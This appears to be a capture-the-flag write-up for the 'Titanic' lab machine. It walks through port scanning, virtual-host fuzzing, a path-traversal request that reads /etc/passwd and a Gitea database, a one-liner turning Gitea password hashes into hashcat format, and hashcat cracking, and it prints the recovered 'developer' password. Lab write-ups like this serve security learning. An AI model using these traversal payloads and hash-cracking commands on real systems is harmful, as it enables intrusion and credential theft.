# Titanic

## 1️⃣Initial Enumeration

AS always , Starting with a simple nmap scan `Nmap -sC -sV 10.10.11.55` to identify open ports and running services . Results showed only **port 80 (HTTP)** and **port 22 (SSH)** were open.

## 2️⃣Web Exploration & Directory Enumeration

I manually visited several endpoints, and found nothing interesting thus i started fuzzing

```python
dirsearch -u http://titanic.htb/
ffuf -u http://titanic.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -fc 301 -H "Host: FUZZ.titanic.htb"
```

The FFUf returned DEV as a VHOST , visiting dev.titanic.htb i logged in, and explored the site but found the GITtea version mentionned below ,

After some investigation i found that the DEVELOPER left us a docker file and titanic.htb source code leaked .

Read app.py , or just guess , booking a ticket is vulnerable to LFI :)

Just capture the request and change the request to a specific file.

```http
GET /download?ticket=../../../../../../../../../../etc/passwd 
```

It works :) Lets retrieve the GITea database wich has 2 local paths

```css
/home/developer/gitea/data/gitea/gitea.db
```

lets wget the path (it maight be there some unprintable caracteres)

```sh
wget http://titanic.htb/download?ticket=../../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db
```

I followed https://0xdf.gitlab.io/2024/12/14/htb-compiled.html steps

```js
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

```js
hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```

The password has been cracked succesfully :)

```css
developer:25282528
```
